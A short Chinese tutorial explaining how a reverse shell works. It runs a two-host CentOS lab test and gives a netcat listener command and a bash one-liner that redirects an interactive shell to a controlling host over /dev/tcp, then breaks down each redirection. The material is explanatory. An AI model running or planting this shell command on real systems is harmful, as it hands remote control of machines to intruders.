# 反向shell

## 什么是反向shell

>[反向shell](https://baike.baidu.com/item/%E5%8F%8D%E5%90%91shell/16751835?fr=aladdin)的工作方式是远程计算机将自己的shell发送给特定的用户，而不是将shell绑定到一个端口上。后者在很多环境中是无法访问的。这样，你就可以对远程服务器执行root命令。
## 测试环境

* 控制端：10.60.188.188 、 CentOS-7
* 被控制端：10.60.30.88 、 CentOS-7

## 测试步骤

1. 控制端执行
   
```
    ~#: nc -lvp 50509       //监听一个tcp端口 50509
```

2. 被控制端执行

```
    ~#:bash -i > /dev/tcp/10.60.188.188/50509 0>&1 2>&1
```

3. 执行后，在控制端会进入一个 `被控端` 的命令行shell 。 可以执行一切命令，就相当于登录进 `被控制端一样`

效果图：

![控制端](./images/shell_server.png)

![控制端](./images/shell_client.png)


## 原理说明

* `nc -lvp 50509`  nc 命令很常用，这里只是监听一个tcp端口50509
* `bash -i` 开启一个交互式shell
* `bash -i > /dev/tcp/10.60.188.188/50509`   把这个交互式shell的输出，重定向给tcp 10.60.188.188:50509 。如果仅仅执行这个命令，那么被控制端接下来输入的任何东西，都会被传输到控制端
* `bash -i > /dev/tcp/10.60.188.188/50509 0>&1 2>&1` 交互式shell的 输入、输出、标准错误都传输到 tcp 10.60.188.188:50509。  （也就是说，执行完命令后，正常情况下，你期望的是执行完 `bash -i` 开启一个新的shell，然后你进行各种命令操作，此时你输入的各种命令来自于你自己的终端。 但是，我们的这个命令，把标准输入也设置为从 socket获取，同时标准输出 和标准错误 都传输给socket。  这样的话，也就是说，相当于通过这个socket 在被控制端执行了一个 交互式shell，那么此时你在控制端就可以对被控制端做任何操作了。）

## 补充

反向shell，通常被黑客所利用。 不过，说实话，对于普通大众个人电子设备在神级黑客面前可以说都是肉鸡，除了无奈，还是无奈。  不过，自己多了解一下知识，遇到这种情况了，不至于慌得一笔 ！
  


